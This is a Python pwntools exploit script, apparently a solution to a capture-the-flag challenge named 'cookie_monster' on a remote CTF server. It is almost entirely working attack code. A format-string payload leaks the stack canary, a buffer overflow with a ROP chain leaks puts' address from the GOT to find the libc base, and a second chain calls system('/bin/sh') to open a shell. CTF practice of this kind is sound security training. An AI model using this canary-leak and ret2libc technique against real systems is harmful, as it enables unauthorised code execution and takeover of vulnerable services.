from pwn import *

r = remote('ctf99.cs.ui.ac.id', 9135)
# r = process('./cookie_monster')
context.arch = 'amd64'
e = ELF('./cookie_monster')
rop = ROP(e)

# VAR
PUTS = e.plt['puts']
VULN = 0x0000000000400839
PUTS_GOT = e.got['puts'] # 0x601018
POP_RET = rop.find_gadget(['pop rdi', 'ret'])[0] # 0x400993 # pop rdi ; ret rdi itu utk param 1


# SYSTEM = 0x7ffff7a33440
# BINSH = 0x7ffff7b97e9a
print('puts:', hex(PUTS))
print('puts_got:', hex(PUTS_GOT))
print('pop_ret:', hex(POP_RET))


payload = '%21$lx'
print(r.recvline())
print(r.recvline())

r.sendline(payload)
print(r.recvuntil('testimony: '))
cookie = r.recv(16)
print(cookie)
r.sendline('y')


# 0x00000000510c82c7
payload = 'A'*108  + p32(int(cookie[:8], 16)) + 'B'*8 + p64(POP_RET) + p64(PUTS_GOT) + p64(PUTS) + p64(VULN)
# payload = 'A'*104 + p32(0xa1c63103) + p32(int(0xa1c63103))+ 'B'*8 + p64(PUTS_GOT) + p64(POP_RET) + p64(PUTS_GOT)
# with open('payload', 'wb') as o:
# 	o.write(payload)
r.sendline(payload)
# print(r.recvuntil('(y/n)? '))

# print(r.recvuntil('testimony: '))
# address = int(r.recv(16), 16)
# print(hex(address))

r.sendline('n')
# r.sendline(payload)
# r.recv(10)
print(r.recvuntil('Thank you!'))
LEAK = r.recv(6)
print(len(LEAK))
LEAK = u64(LEAK.ljust(8, b'\x00'))
print(hex(LEAK))

libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
PUTS_OFFSET = libc.symbols['puts']
print('PUTS_OFFSET', hex(PUTS_OFFSET))
LIBC_BASE = LEAK - PUTS_OFFSET
print(hex(LIBC_BASE))

SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = list(libc.search(b'/bin/sh'))[0]

SYSTEM = LIBC_BASE + SYSTEM_OFFSET
BINSH = LIBC_BASE + BINSH_OFFSET
print(hex(SYSTEM))
print(hex(BINSH))

# r.sendline('a')
# r.recvline()
# r.recv(1)
payload = 'A'*108  + p32(int(cookie[:8], 16)) + 'B'*8 + p64(POP_RET) + p64(BINSH) + p64(SYSTEM)
# payload = 'A'*108  + p32(int(cookie[:8], 16)) + 'B'*8 + p64(POP_RET) + p64(PUTS_GOT) + p64(PUTS) + p64(VULN)
r.sendline(payload)
# print(r.recvuntil('Thank you!'))
# r.sendline(payload)
# r.sendline(payload)
r.interactive()

